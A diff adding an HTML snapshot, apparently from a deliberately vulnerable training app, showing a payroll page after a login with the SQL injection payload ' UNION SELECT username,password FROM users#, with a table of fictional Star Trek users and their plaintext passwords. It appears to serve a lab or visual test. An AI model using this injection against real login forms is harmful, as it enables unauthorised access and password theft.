@@ -1,0 +1,44 @@
+<!--
+  startrek_payroll: the payroll page after logging in as
+  ' UNION SELECT username,password FROM users#
+  so the salary column shows every user's password.
+
+  The markup below <style> is what app/index.php echoes for that login, with
+  the rows the UNION returns from mysql/init.sql, in insert order. Like the
+  app's page it has no DOCTYPE, so it renders in quirks mode as the app does.
+
+  The app has no styles of its own. The <style> pins the font to DejaVu
+  Serif rather than the browser's default serif, which varies by machine, and
+  sets the site colours: the table's inline border is black, which would
+  vanish on the dark background.
+-->
+<meta charset="utf-8">
+<style>
+  body,
+  table {
+    background: var(--surface);
+    color: var(--on-surface);
+    font-family: 'DejaVu Serif', serif;
+  }
+  table {
+    border-color: var(--on-surface) !important;
+  }
+  /* 15px from the top rather than the default 8px, which leaves the third
+     row of the table half in view. */
+  body {
+    margin-top: 15px;
+  }
+</style>
+<center><h2>Welcome, ' UNION SELECT username,password FROM users#</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>Salary</th></tr><tr><td>james_kirk</td><td>kobayashi_maru</td></tr>
+<tr><td>mr_spock</td><td>0nlyL0g!c</td></tr>
+<tr><td>leonard_mccoy</td><td>hesDEADjim!</td></tr>
+<tr><td>nyota_uhura</td><td>StarShine</td></tr>
+<tr><td>montgomery_scott</td><td>ScottyDoesntKnow</td></tr>
+<tr><td>hiraku_sulu</td><td>parking-break-on</td></tr>
+<tr><td>pavel_chekov</td><td>99victorvictor2</td></tr>
+</table></center>
+<script>
+  document.fonts.ready.then(() => {
+    document.body.dataset.ready = '';
+  });
+</script>
